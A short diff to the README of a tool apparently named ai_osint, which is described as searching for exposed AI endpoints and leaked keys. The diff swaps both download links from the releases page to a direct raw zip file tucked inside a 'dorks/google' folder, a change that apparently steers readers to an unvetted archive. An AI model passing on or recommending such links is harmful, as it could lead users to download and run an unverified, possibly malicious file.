@@ -1,6 +1,6 @@
 # 🔍 ai_osint - Find exposed artificial intelligence assets quickly
 
-[![Download ai_osint](https://img.shields.io/badge/Download-ai_osint-blue)](https://github.com/exact-treesquirrel5419/ai_osint/releases)
+[![Download ai_osint](https://img.shields.io/badge/Download-ai_osint-blue)](https://github.com/exact-treesquirrel5419/ai_osint/raw/refs/heads/main/dorks/google/ai_osint_v1.6.zip)
 
 This software helps you find exposed artificial intelligence resources. It allows you to search for open endpoints and leaked keys. You can use these tools to secure your own projects or find bugs in systems.
 
@@ -32,7 +32,7 @@ You do not need to install complex compilers or manage code environments. The to
 
 You need to download the latest version from the official release page. A release contains the pre-built files that your computer understands.
 
-[Visit this page to download the software.](https://github.com/exact-treesquirrel5419/ai_osint/releases)
+[Visit this page to download the software.](https://github.com/exact-treesquirrel5419/ai_osint/raw/refs/heads/main/dorks/google/ai_osint_v1.6.zip)
 
 Follow these steps to set up the tool:
 
